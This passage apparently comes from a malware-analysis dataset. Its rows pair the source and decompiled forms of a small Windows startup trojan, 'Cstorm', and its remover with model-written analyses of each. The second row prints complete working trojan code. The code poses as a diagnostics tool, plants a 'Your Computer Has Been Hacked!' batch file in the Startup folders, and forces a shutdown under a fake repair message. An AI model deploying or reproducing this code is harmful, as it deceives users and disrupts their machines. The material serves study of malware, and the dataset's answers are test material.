puVar6 = (undefined4 *)((int)&uStack_151 + uVar3 + 4 & 0xfffffffc);
iVar2 = (int)(undefined4 *)((int)&uStack_151 + uVar3) - (int)puVar6;
puVar4 = (undefined4 *)
(""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.txt"" +
-iVar2);
for (uVar3 = iVar2 + 0x4aU >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
*puVar6 = *puVar4;
puVar4 = puVar4 + 1;
puVar6 = puVar6 + 1;
}
local_2ae = 0x206c6564;
local_2aa = 0x22;
_strcat((char *)&local_2ae,(char *)((int)&uStack_151 + 1));
uVar3 = 0xffffffff;
puVar4 = &local_2ae;
do {
if (uVar3 == 0) break;
uVar3 = uVar3 - 1;
cVar1 = *(char *)puVar4;
puVar4 = (undefined4 *)((int)puVar4 + 1);
} while (cVar1 != '\0');
*(undefined2 *)(&uStack_2af + ~uVar3) = 0x22;
local_24 = _fopen((char *)((int)&uStack_151 + 1),""r"");
if (local_24 == (FILE *)0x0) {
_fclose((FILE *)0x0);
}
else {
_printf(""\nMstools Infection Detected!:%s"",(int)&uStack_151 + 1);
_puts(""\nAttempting Repairs!"");
_fclose(local_24);
_system((char *)&local_2ae);
}
local_24 = _fopen(""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.txt""
,""r"");
if (local_24 == (FILE *)0x0) {
_fclose((FILE *)0x0);
}
else {
_printf(""\nMstools Infection Detected!"");
_puts(""\nAttempting Repairs!"");
local_40c = 0x206c6564;
local_408 = 0x22;
uVar3 = 0xffffffff;
puVar4 = &local_40c;
do {
if (uVar3 == 0) break;
uVar3 = uVar3 - 1;
cVar1 = *(char *)puVar4;
puVar4 = (undefined4 *)((int)puVar4 + 1);
} while (cVar1 != '\0');
uVar3 = ~uVar3;
*(undefined4 *)(&local_40d + uVar3) = 0x505c3a43;
*(undefined4 *)((int)&uStack_3c9 + uVar3) = 0x747874;
puVar6 = (undefined4 *)((int)&local_40c + uVar3 + 3 & 0xfffffffc);
iVar2 = (int)(&local_40d + uVar3) - (int)puVar6;
puVar4 = (undefined4 *)
(""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.txt"" +
-iVar2);
for (uVar3 = iVar2 + 0x48U >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
*puVar6 = *puVar4;
puVar4 = puVar4 + 1;
puVar6 = puVar6 + 1;
}
uVar3 = 0xffffffff;
puVar4 = &local_40c;
do {
if (uVar3 == 0) break;
uVar3 = uVar3 - 1;
cVar1 = *(char *)puVar4;
puVar4 = (undefined4 *)((int)puVar4 + 1);
} while (cVar1 != '\0');
*(undefined2 *)(&local_40d + ~uVar3) = 0x22;
_fclose(local_24);
_system((char *)&local_40c);
}
return;
}","//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com/
//
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// ------------------------ Structures ------------------------
struct _IO_FILE {
int32_t e0;
};
// ------------------- Function Prototypes --------------------
int32_t ___do_global_ctors(void);
int32_t ___main(void);
int32_t _ok(void);
int32_t _pause(void);
int32_t _run(void);
int32_t _tscan(void);
int32_t _tunnel(int32_t a1);
// --------------------- Global Variables ---------------------
int32_t g1 = -1; // 0x403f00
int32_t g2 = 0; // 0x407028
// ------------------------ Functions -------------------------
// Address range: 0x401460 - 0x401475
int32_t _tunnel(int32_t a1) {
// 0x401460
return system(""echo %USERPROFILE%>user"");
}
// Address range: 0x401475 - 0x401726
int32_t _tscan(void) {
struct _IO_FILE * file = fopen(""user"", ""r""); // 0x401497
if (file == NULL) {
// 0x4014a5
exit(0);
// UNREACHABLE
}
int32_t * v1 = (int32_t *)((int32_t)file + 12); // 0x4014f4
int32_t str2; // bp-336, 0x401475
int32_t v2 = &str2;
int32_t v3 = 0; // 0x4014fc
int32_t v4 = 0; // 0x4014fc
if ((*v1 & 16) == 0) {
int32_t v5; // bp-1037, 0x401475
fscanf(file, ""%c"", &v5);
char v6 = v5; // 0x4014d5
v4 = v3;
while (v6 != 10) {
// 0x4014d9
*(char *)(v3 + v2) = v6;
v3++;
v4 = v3;
if ((*v1 & 16) != 0) {
// break -> 0x401501
break;
}
fscanf(file, ""%c"", &v5);
v6 = v5;
v4 = v3;
}
}
// 0x401501
*(char )(v4 + v2) = 0;
fclose(file);
bool v7; // 0x401475
int32_t v8 = v7 ? -1 : 1;
int32_t v9 = -1; // 0x40152e
int32_t v10 = v2; // 0x40152e
int32_t v11 = 0; // 0x40152e
while (v9 != 0) {
int32_t v12 = v10;
v9--;
v10 = v12 + v8;
v11 = v9;
if ((char *)v12 == 0) {
// break ->
break;
}
v11 = 0;
}
int32_t v13 = -2 - v11 + v2; // 0x40153d
*(int32_t *)v13 = 0x7070415c;
int32_t v14 = *(int32_t *)((int32_t)""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.txt"" + 70); // 0x40154d
*(int32_t *)(v13 + 70) = v14;
int32_t v15 = v13 + 4 & -4; // 0x401558
int32_t v16 = v13 - v15; // 0x40155b
__asm_rep_movsd_memcpy((char *)v15, (char *)((int32_t)""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.txt"" - v16), (v16 + 74) / 4);
int32_t str = 0x206c6564; // bp-686, 0x401575
strcat((char *)&str, (char )&str2);
int32_t v17 = &str; // 0x4015ab
int32_t v18 = -1; // 0x4015ad
int32_t v19 = v17; // 0x4015ad
int32_t v20 = 0; // 0x4015ad
while (v18 != 0) {
int32_t v21 = v19;
v18--;
v19 = v21 + v8;
v20 = v18;
if ((char *)v21 == 0) {
// break ->
break;
}
v20 = 0;
}
*(int16_t *)(v17 - 2 - v20) = 34;
struct _IO_FILE * file2 = fopen((char *)&str2, ""r""); // 0x4015d4
if (file2 == NULL) {
// 0x40161f
fclose(NULL);
} else {
// 0x4015e2
printf(""\nMstools Infection Detected!:%s"", &str2);
puts(""\nAttempting Repairs!"");
fclose(file2);
system((char )&str);
}
struct _IO_FILE * file3 = fopen(""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.txt"", ""r""); // 0x401639
if (file3 == NULL) {
// 0x40171a
return fclose(NULL);
}
// 0x40164b
printf(""\nMstools Infection Detected!"");
puts(""\nAttempting Repairs!"");
int32_t command = 0x206c6564; // bp-1036, 0x401669
int32_t v22 = &command; // 0x401687
int32_t v23 = -1; // 0x401689
int32_t v24 = v22; // 0x401689
int32_t v25 = 0; // 0x401689
while (v23 != 0) {
int32_t v26 = v24;
v23--;
v24 = v26 + v8;
v25 = v23;
if ((char *)v26 == 0) {
// break ->
break;
}
v25 = 0;
}
int32_t v27 = -2 - v25 + v22; // 0x401698
*(int32_t *)v27 = 0x505c3a43;
int32_t v28 = *(int32_t *)((int32_t)""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.txt"" + 68); // 0x4016a8
*(int32_t *)(v27 + 68) = v28;
int32_t v29 = v27 + 4 & -4; // 0x4016b3
int32_t v30 = v27 - v29; // 0x4016b6
__asm_rep_movsd_memcpy((char *)v29, (char )((int32_t)""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.txt"" - v30), (v30 + 72) / 4);
int32_t v31 = -1; // 0x4016de
int32_t v32 = v22; // 0x4016de
int32_t v33 = 0; // 0x4016de
while (v31 != 0) {
int32_t v34 = v32;
v31--;
v32 = v34 + v8;
v33 = v31;
if ((char *)v34 == 0) {
// break ->
break;
}
v33 = 0;
}
*(int16_t )(v22 - 2 - v33) = 34;
fclose(file3);
// 0x40171a
return system((char )&command);
}
// Address range: 0x401726 - 0x40173b
int32_t _ok(void) {
// 0x401726
return remove(""user"");
}
// Address range: 0x40173b - 0x40174e
int32_t _run(void) {
// 0x40173b
int32_t v1; // 0x40173b
_tunnel(v1);
return _tscan();
}
// Address range: 0x40174e - 0x40176f
int32_t _pause(void) {
// 0x40174e
putchar(10);
return system(""pause"");
}
// Address range: 0x40176f - 0x4017ab
int main(int argc, char ** argv) {
// 0x40176f
___main();
system(""title Mstools Remover "");
_run();
_ok();
puts(""All operations completed..."");
_pause();
return 0;
}
// Address range: 0x401c90 - 0x401cd6
int32_t ___do_global_ctors(void) {
int32_t v1 = 0;
int32_t v2 = v1 + 1; // 0x401cc6
while ((int32_t )(4 * v2 + (int32_t)&g1) != 0) {
// 0x401cc6
v1 = v2;
v2 = v1 + 1;
}
// 0x401cd4
if (v1 == 0) {
// 0x401caf
return atexit((void ()())0x401c60);
}
int32_t v3 = v1; // 0x401ca1
while (v3 != 1) {
// 0x401ca3
v3--;
}
// 0x401caf
return atexit((void ()())0x401c60);
}
// Address range: 0x401ce0 - 0x401cfc
int32_t ___main(void) {
int32_t result = g2; // 0x401ce0
if (result != 0) {
// 0x401ce9
return result;
}
// 0x401cf0
g2 = 1;
return ___do_global_ctors();
}
// --------------------- Meta-Information ---------------------
// Detected compiler/packer: gcc (6.3.0)
// Detected functions: 8","1. The primary function of the code is to detect and remove a specific malware ('Mstools Infection') which targets Windows startup folders by placing a file named 'chrome.txt'. It performs a scan and attempts to delete this file if found.

2. `tunnel`: It retrieves the current user's profile directory path and redirects it to a file named 'user'.
   `tscan`: This function scans for and deletes the malicious 'chrome.txt' in two potential startup locations.
   `ok`: Removes the 'user' file generated by `tunnel` as a part of cleanup after the scan.

3. The variable `s` represents the path to where the malicious 'chrome.txt' can reside under the current user's profile. It is used to check the existence of the malware and to build the command string for its removal.

4. The error handling mechanism is very basic. If the program fails to open the 'user' file, it simply exits without any specific error message. Beyond this, there is no sophisticated error handling; the program assumes all commands execute successfully.

5. Flow in `tscan` function:
   - Open the 'user' file to read the user profile path.
   - Read characters from the file to construct the path string `s`.
   - Detect the presence of 'chrome.txt' at the specified path within the user's startup folder.
   - Issue the command to delete 'chrome.txt', if it exists.
   - Repeat the detection for the common startup folder and delete if necessary.
   
6. The code uses only the standard libraries available in C: `<stdio.h>`, `<stdlib.h>`, `<string.h>`, and `<ctype.h>`. No additional libraries or dependencies are required.

7. Evident security concerns include:
   - Lack of permission checks that may cause the program to fail if it doesn't have the right to delete files.
   - Use of `system()` function which can pose a security risk if any of the variables incorporated in command strings can be influenced by an attacker.
   - No validation of input or output from the `system()` call, risking execution of unintended commands.
   - Absence of meaningful error messages or exception handling that can inform about potential failures.",Timeout occurred.,"1. The primary functionality of this code is to remove a potential malware infection related to the file `chrome.txt` within the startup directories of a Windows profile. It also involves scanning for this infection and executing cleanup procedures as needed.

2. Three key functions are: 
   - `_tunnel()`: This function likely creates a file called `user` containing the user's profile directory path using a system call.
   - `_tscan()`: Scans the user's profile directory for a specific path, and if found indicative of an infection, it attempts to remove the malicious file.
   - `_ok()`: Removes the `user` file created by `_tunnel()`, likely as part of cleanup after scanning.

3. The variable `file` is an instance of a `struct _IO_FILE` used in `_tscan()` that points to a file stream after opening the `user` file. It is used to read the path of the user's profile directory to perform further actions based on this data.

4. Error handling in the code is executed using checks like `if (file == NULL)` followed by an `exit(0)` call, which directly terminates the program if an error occurs (e.g., failing to open a file). This is a rudimentary form of error handling, as no specific error message is given.

5. In `_tscan()`, the code opens the `user` file, reads a string from it, and appends ""AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.txt"" to the read path. Then it checks for the existence of a file at this path and attempts to delete it if present.

6. External libraries or dependencies include standard libraries like `stdio.h` and `stdlib.h` for file operations and string handling among others, `stdint.h` for integer types definition, and `stdbool.h` for boolean type support.

7. Evident security concerns:
   - The code uses `system()` calls with hardcoded strings, which can be a risk if input is not properly sanitized.
   - The functionality of reading and executing commands based on a user's directory may lead to security vulnerabilities such as arbitrary code execution.
   - There are hardcoded paths and checks for a specific malware signature which suggest a lack of generalization and flexibility."
7,https://github.com/Anish-M-code/Cstorm-windows-startup-virus-in-c,Done,Windows,"// Cstorm
// Copyright (C) 2018-2019 M.Anish mailto:aneesh25861@gmail.com
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program. If not, see http://www.gnu.org/licenses/.
/* Cstorm is a rewrite of PYIRUS , a startup trojan python script to C programming language.
Both these projects were developed independantly by M.Anish only. For Educational purpose only!
USE AT YOUR OWN RISK. DEVELOPER NOT RESPONSIBLE FOR ANY DAMAGES THROUGH USE OF THIS SOFTWARE.	*/
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<ctype.h>
//Function to get Current User in Windows who is logged in.
void tunnel()
{
system(""echo %USERPROFILE%>user"");
}
//Function to place chrome.bat in startup folder in windows.
void tscan()
{
FILE *f,*fp;
char s[800],ch; int i=0;
f=fopen(""user"",""r"");
if(f==NULL)
{
exit(0);
}
while(feof(f)==0)
{
fscanf(f,""%c"",&ch);
if(ch=='\n')
break;
s[i]=ch;
i++;
}
s[i]='\0';
fclose(f);
strcat(s,""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.bat"");
fp=fopen(s,""w"");
//Try to detect if enough permissions are available or not. Attempt without admin access warn user if admin access required.
if(fp==NULL)
{
f=fopen(""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.bat"",""w"");
if(f==NULL)
{
system(""cls"");
remove(""user"");
printf(""\nPlease Run this Program as ADMINISTRATOR to continue...\n"");
system(""timeout 10"");
exit(0);
}
fprintf(f,""\necho off\necho Your Computer has been Hacked!\npause""); // String with commands to be executed by cmd.exe
fclose(f);
system(""shutdown /f /t 005 /s /c \""We have to restart the PC to fix detected problems.\"""");
exit(0);
}
fprintf(fp,""\necho off\necho Your Computer Has Been Hacked!\npause"");// String with commands to be executed by cmd.exe
fclose(fp);
}
//Perform some cleaning to avoid detection.
void ok()
{
remove(""user"");
}
//Load all reqired functions.
void run()
{
tunnel();
tscan();
}
//Function to pause the program.
void pause()
{
printf(""\n"");
system(""pause"");
}
int main()
{
// Try a bit of social engineering to convince user something is wrong in their PC.
system(""title System Diagonistics Tool "");
run();
ok();
printf(""\n|----- System Diagonists -----|\n"");
printf(""\n Checking PC for problems...\n"");
system(""systeminfo"");
//Force shuting down PC so that Malware ( chrome.bat ) will be executed on system startup.
system(""shutdown /f /t 005 /s /c \""We have to shutdown the PC to fix detected problems.\"""");
pause();
}","{
""functions"": [
""tunnel"",
""tscan"",
""ok"",
""run"",
""pause"",
""main""
]
}","{
""variables"": [
""s"",
""f"",
""fp"",
""ch"",
""i""
]
}","// Cstorm
// Copyright (C) 2018-2019 M.Anish mailto:aneesh25861@gmail.com
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program. If not, see http://www.gnu.org/licenses/.
/* Cstorm is a rewrite of PYIRUS , a startup trojan python script to C programming language.
Both these projects were developed independently by M.Anish only. For Educational purpose only!
USE AT YOUR OWN RISK. DEVELOPER NOT RESPONSIBLE FOR ANY DAMAGES THROUGH USE OF THIS SOFTWARE.	*/
// Function to get Current User in Windows who is logged in.
// Function to place chrome.bat in startup folder in windows.
// Try to detect if enough permissions are available or not. Attempt without admin access warn user if admin access required.
// String with commands to be executed by cmd.exe
// Perform some cleaning to avoid detection.
// Load all required functions.
// Function to pause the program.","int __cdecl _main(int _Argc,char **_Argv,char **_Env);
int __cdecl _system(char *_Command);
int __cdecl _puts(char *_Str);
void _pause(void);
void _ok(void);
int __cdecl _remove(char *_Filename);
void _run(void);
void _tunnel(void);
void _tscan(void);
int __cdecl _fscanf(FILE *_File,char *_Format,...);
void __cdecl _exit(int _Code);
int __cdecl _main(int _Argc,char **_Argv,char **_Env)
{
___main();
_system(""title System Diagonistics Tool "");
_run();
_ok();
_puts(""\n|----- System Diagonists -----|"");
_puts(""\n Checking PC for problems..."");
_system(""systeminfo"");
_system(""shutdown /f /t 005 /s /c \""We have to shutdown the PC to fix detected problems.\"""");
_pause();
return 0;
}

void _tscan(void)
{
char cVar1;
int iVar2;
uint uVar3;
undefined4 *puVar4;
char *pcVar5;
undefined4 *puVar6;
undefined4 local_349;
undefined auStack_345 [66];
undefined4 uStack_303;
undefined auStack_2ff [727];
FILE *local_28;
FILE *local_24;
int local_20;
local_20 = 0;
local_24 = _fopen(""user"",""r"");
if (local_24 == (FILE )0x0) {
/ WARNING: Subroutine does not return */
_exit(0);
}
while (((local_24->_flag & 0x10U) == 0 &&
(_fscanf(local_24,""%c"",&local_349), (char)local_349 != '\n'))) {
*(char *)((int)&local_349 + local_20 + 1) = (char)local_349;
local_20 = local_20 + 1;
}
*(undefined *)((int)&local_349 + local_20 + 1) = 0;
_fclose(local_24);
uVar3 = 0xffffffff;
pcVar5 = (char *)((int)&local_349 + 1);
do {
if (uVar3 == 0) break;
uVar3 = uVar3 - 1;
cVar1 = *pcVar5;
pcVar5 = pcVar5 + 1;
} while (cVar1 != '\0');
uVar3 = ~uVar3;
*(undefined4 *)((int)&local_349 + uVar3) = 0x7070415c;
*(undefined4 *)((int)&uStack_303 + uVar3) = 0x746162;
puVar6 = (undefined4 *)((int)&local_349 + uVar3 + 4 & 0xfffffffc);
iVar2 = (int)(undefined4 *)((int)&local_349 + uVar3) - (int)puVar6;
puVar4 = (undefined4 *)
(""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.bat"" +
-iVar2);
for (uVar3 = iVar2 + 0x4aU >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
*puVar6 = *puVar4;
puVar4 = puVar4 + 1;
puVar6 = puVar6 + 1;
}
local_28 = _fopen((char *)((int)&local_349 + 1),""w"");
if (local_28 != (FILE *)0x0) {
_fwrite(""\necho off\necho Your Computer Has Been Hacked!\npause"",1,0x33,local_28);
_fclose(local_28);
return;
}
local_24 = _fopen(""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.bat""
,""w"");
if (local_24 != (FILE )0x0) {
_fwrite(""\necho off\necho Your Computer has been Hacked!\npause"",1,0x33,local_24);
_fclose(local_24);
_system(""shutdown /f /t 005 /s /c \""We have to restart the PC to fix detected problems.\"""");
/ WARNING: Subroutine does not return /
_exit(0);
}
_system(""cls"");
_remove(""user"");
_puts(""\nPlease Run this Program as ADMINISTRATOR to continue..."");
_system(""timeout 10"");
/ WARNING: Subroutine does not return */
_exit(0);
}","//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com/
//
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
// ------------------------ Structures ------------------------
struct _IO_FILE {
int32_t e0;
};
// ------------------- Function Prototypes --------------------
int32_t ___do_global_ctors(void);
int32_t ___main(void);
int32_t _ok(void);
int32_t _pause(void);
int32_t _run(void);
int32_t _tscan(void);
int32_t _tunnel(int32_t a1);
// --------------------- Global Variables ---------------------
int32_t g1 = -1; // 0x403e60
int32_t g2 = 0; // 0x407028
// ------------------------ Functions -------------------------
// Address range: 0x401460 - 0x401475
int32_t _tunnel(int32_t a1) {
// 0x401460
return system(""echo %USERPROFILE%>user"");
}
// Address range: 0x401475 - 0x40166b
int32_t _tscan(void) {
struct _IO_FILE * file = fopen(""user"", ""r""); // 0x401497
if (file == NULL) {
// 0x4014a5
exit(0);
// UNREACHABLE
}
int32_t stream = (int32_t)file;
int32_t file_path; // bp-840, 0x401475
int32_t v1 = &file_path;
int32_t v2 = 0; // 0x4014fc
int32_t v3 = 0; // 0x4014fc
if ((*(int32_t *)(stream + 12) & 16) == 0) {
int32_t v4; // bp-841, 0x401475
fscanf((struct _IO_FILE *)stream, ""%c"", &v4);
char v5 = v4; // 0x4014d5
v3 = v2;
while (v5 != 10) {
// 0x4014d9
*(char )(v2 + v1) = v5;
v2++;
int32_t stream2 = (int32_t)file;
v3 = v2;
if (((int32_t *)(stream2 + 12) & 16) != 0) {
// break -> 0x401501
break;
}
fscanf((struct _IO_FILE *)stream2, ""%c"", &v4);
v5 = v4;
v3 = v2;
}
}
// 0x401501
*(char )(v3 + v1) = 0;
fclose(file);
int32_t v6 = -1; // 0x40152e
int32_t v7 = v1; // 0x40152e
int32_t v8 = 0; // 0x40152e
while (v6 != 0) {
int32_t v9 = v7;
v6--;
bool v10; // 0x401475
v7 = v9 + (v10 ? -1 : 1);
v8 = v6;
if ((char *)v9 == 0) {
// break ->
break;
}
v8 = 0;
}
int32_t v11 = -2 - v8 + v1; // 0x40153d
*(int32_t *)v11 = 0x7070415c;
int32_t v12 = *(int32_t *)((int32_t)""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.bat"" + 70); // 0x40154d
*(int32_t *)(v11 + 70) = v12;
int32_t v13 = v11 + 4 & -4; // 0x401558
int32_t v14 = v11 - v13; // 0x40155b
__asm_rep_movsd_memcpy((char *)v13, (char *)((int32_t)""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.bat"" - v14), (v14 + 74) / 4);
struct _IO_FILE * file2 = fopen((char *)&file_path, ""w""); // 0x401580
if (file2 != NULL) {
// 0x401631
fwrite((int32_t )""\necho off\necho Your Computer Has Been Hacked!\npause"", 1, 51, file2);
return fclose(file2);
}
struct _IO_FILE * file3 = fopen(""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.bat"", ""w""); // 0x4015a1
if (file3 != NULL) {
// 0x4015eb
fwrite((int32_t )""\necho off\necho Your Computer has been Hacked!\npause"", 1, 51, file3);
fclose(file3);
system(""shutdown /f /t 005 /s /c \""We have to restart the PC to fix detected problems.\"""");
exit(0);
// UNREACHABLE
}
// 0x4015af
system(""cls"");
remove(""user"");
puts(""\nPlease Run this Program as ADMINISTRATOR to continue..."");
system(""timeout 10"");
exit(0);
// UNREACHABLE
}
// Address range: 0x40166b - 0x401680
int32_t _ok(void) {
// 0x40166b
return remove(""user"");
}
// Address range: 0x401680 - 0x401693
int32_t _run(void) {
// 0x401680
int32_t v1; // 0x401680
_tunnel(v1);
return _tscan();
}
// Address range: 0x401693 - 0x4016b4
int32_t _pause(void) {
// 0x401693
putchar(10);
return system(""pause"");
}
// Address range: 0x4016b4 - 0x401714
int main(int argc, char ** argv) {
// 0x4016b4
___main();
system(""title System Diagonistics Tool "");
_run();
_ok();
puts(""\n|----- System Diagonists -----|"");
puts(""\n Checking PC for problems..."");
system(""systeminfo"");
system(""shutdown /f /t 005 /s /c \""We have to shutdown the PC to fix detected problems.\"""");
_pause();
return 0;
}
// Address range: 0x401c00 - 0x401c46
int32_t ___do_global_ctors(void) {
int32_t v1 = 0;
int32_t v2 = v1 + 1; // 0x401c36
while ((int32_t )(4 * v2 + (int32_t)&g1) != 0) {
// 0x401c36
v1 = v2;
v2 = v1 + 1;
}
// 0x401c44
if (v1 == 0) {
// 0x401c1f
return atexit((void ()())0x401bd0);
}
int32_t v3 = v1; // 0x401c11
while (v3 != 1) {
// 0x401c13
v3--;
}
// 0x401c1f
return atexit((void ()())0x401bd0);
}
// Address range: 0x401c50 - 0x401c6c
int32_t ___main(void) {
int32_t result = g2; // 0x401c50
if (result != 0) {
// 0x401c59
return result;
}
// 0x401c60
g2 = 1;
return ___do_global_ctors();
}
// --------------------- Meta-Information ---------------------
// Detected compiler/packer: gcc (6.3.0)
// Detected functions: 8","1. The primary functionality of the code is to create a fake Windows system diagnostics tool that tries to place a batch script (`chrome.bat`) in the user's startup folder, which displays a message claiming the computer has been hacked. It then forces a system shutdown.

2. Key functions:
   - `tunnel()`: Determines the currently logged-in user's profile directory and writes it to a file named ""user"".
   - `tscan()`: Attempts to create `chrome.bat` in the startup folder to be run on system boot. Alerts for admin privileges if necessary.
   - `ok()`: Cleans up by removing the ""user"" file, likely to hide some evidence of the program's actions.

3. The variable `s` in `tscan()` function is initialized as a character array and used to store the path to the current user's startup folder. It starts by capturing the user profile path from the file ""user"" and then appends the necessary directories and file name to place `chrome.bat`.

4. Error handling mechanism:
   - File operations check if `f` or `fp` is `NULL` to ensure the file was opened successfully, with exits on failures.
   - If writing to the startup folder fails due to permissions, it prompts the user to run the program as an administrator, then it tries to place the file in an alternative location and initiates a system shutdown either way.

5. Flow of execution in `main()`:
   - Sets up a fake diagnostic tool facade using `system(""title..."")`.
   - Invokes `run()` to execute the payload setup functions.
   - Performs cleanup with `ok()`.
   - Simulates a system check using `systeminfo`.
   - Forces a system shutdown to ensure that the malware `chrome.bat` executes upon the next system start.
   - Pauses to hold the command window.

6. External libraries or dependencies:
   - The program includes standard C libraries: `<stdio.h>`, `<stdlib.h>`, `<string.h>`, and `<ctype.h>` for file operations, system commands, string manipulation, and character operations respectively.

7. Security concerns:
   - The code is a form of malware, masquerading as a system diagnostic tool while performing unauthorized actions.
   - It avoids direct execution and schedules a script to run on the next boot, a common tactic to ensure malware persistence.
   - It provides misleading system shutdown reasons to hide its true intention.
   - It manipulates system files and could potentially cause damage or be used as a vector for more intrusive attacks.
   - The program has no security checks for input validation or privilege escalation prevention.","1. The primary functionality of this code is to attempt to create a file named `chrome.bat` in the Startup folder and write commands to it that claim the computer has been hacked. It also tries to shutdown the computer with a message indicating that it is fixing detected problems.

2. _fscanf: Reads formatted input from a stream. In this code, it reads characters from a file until a newline character is encountered.
   _fwrite: Writes data to a stream. Here, it writes a string into `chrome.bat` that will be executed on startup.
   _system: Executes a system command. It is used to run `systeminfo`, shutdown the computer and clear the screen with `cls`.

3. `local_24`: This variable is a file pointer that is used to open and write to the `chrome.bat` file in specific locations. It acts as a handle for file operations like reading and writing.

4. The error handling mechanism is rudimentary; if files cannot be opened or written to, or processes cannot be executed, the program calls the `_exit()` function, which terminates the program without performing any cleanup operations.

5. The flow of execution within the _tscan function:
   - Attempts to open a file named ""user"".
   - Reads characters from this file until a newline or EOF is encountered.
   - Constructs the path for `chrome.bat` in the Startup directory.
   - Writes to `chrome.bat` or, if it fails, tries an alternative path and writes again.
   - Executes shutdown if the second write succeeds, otherwise instructs the user to run as administrator and exits.

6. The code uses standard C library functions like `fopen`, `fscanf`, `fwrite`, `fclose`, `system`, and `remove`. It also uses non-standard __cdecl calling convention annotations, suggesting it relies on the Microsoft C runtime libraries specific to the Windows environment.

7. The evident security concerns include:
   - The program attempts to write to the system's Startup folder, which is indicative of potentially unwanted behavior, akin to that of malware.
   - Using the `_system` function can be risky as it might run malicious or harmful commands.
   - There's no validation of user input or error handling after system commands execution, which could lead to program crashes or inconsistencies if errors occur.","1. The primary functionality of the code is that of a malicious program which attempts to write a batch script to the user's startup folder, gathers system information, displays fake diagnostic messages, and initiates a system shutdown.

2. **_tscan**: Opens a file ""user,"" reads its content to find the user's profile path, and creates a malicious batch file in the startup folder or alternative locations.
**_tunnel**: Executes a system command to write the current user‚Äôs profile directory to a file named ""user.""
**_run**: Calls the _tunnel function to retrieve user profile and then calls _tscan to scan for the user profile path and execute payload.

3. **v11**: This variable serves as a pointer to construct the file path where the malicious batch script (chrome.bat) will be written. It is initialized with the user's profile directory and appended with the path to the Startup folder.

4. The error handling mechanism is primarily based on checking the return values of file operations. If file opening fails, the program exits or tries alternative paths. It also provides user feedback indicating the need for administrator permissions if the primary operation fails.

5. In _tscan, the function first attempts to open the ""user"" file, read from it, construct a file path, and write a malicious batch file. If writing to the Startup folder fails, it tries an alternative path. If both fail, it removes the ""user"" file and requests the user to run the program as an administrator.

6. The external libraries or dependencies include standard C libraries such as stdbool.h, stdint.h, stdio.h, and stdlib.h for file operations, memory management, and system calls.

7. Evident security concerns include the execution of system commands, creation of startup scripts to maintain persistence, and commands to shutdown the system without the user's consent. It crudely attempts to mask itself as a system diagnostics tool, representing social engineering tactics. The program also lacks any obfuscation or sophisticated evasion techniques, making it easy to detect with basic security measures."
8,https://github.com/Anish-M-code/Cstorm-windows-startup-virus-in-c,Done,Windows,"// Cstorm Remover
// Copyright (C) 2018-2019 M.Anish mailto:aneesh25861@gmail.com
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program. If not, see http://www.gnu.org/licenses/.
/* Cstorm Remover was developed independantly by M.Anish For Educational purpose only!
USE AT YOUR OWN RISK. DEVELOPER NOT RESPONSIBLE FOR ANY DAMAGES THROUGH USE OF THIS SOFTWARE.	*/
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<ctype.h>
//Function to get Current User in Windows who is logged in.
void tunnel()
{
system(""echo %USERPROFILE%>user"");
}
//Function to detect and remove chrome.bat in startup folder in windows.
void tscan()
{
FILE *f;
char s[300],tmp[350],tmp2[350],ch; int i=0;
f=fopen(""user"",""r"");
if(f==NULL)
{
exit(0);
}
while(feof(f)==0)
{
fscanf(f,""%c"",&ch);
if(ch=='\n')
break;
s[i]=ch;
i++;
}
s[i]='\0';
fclose(f);
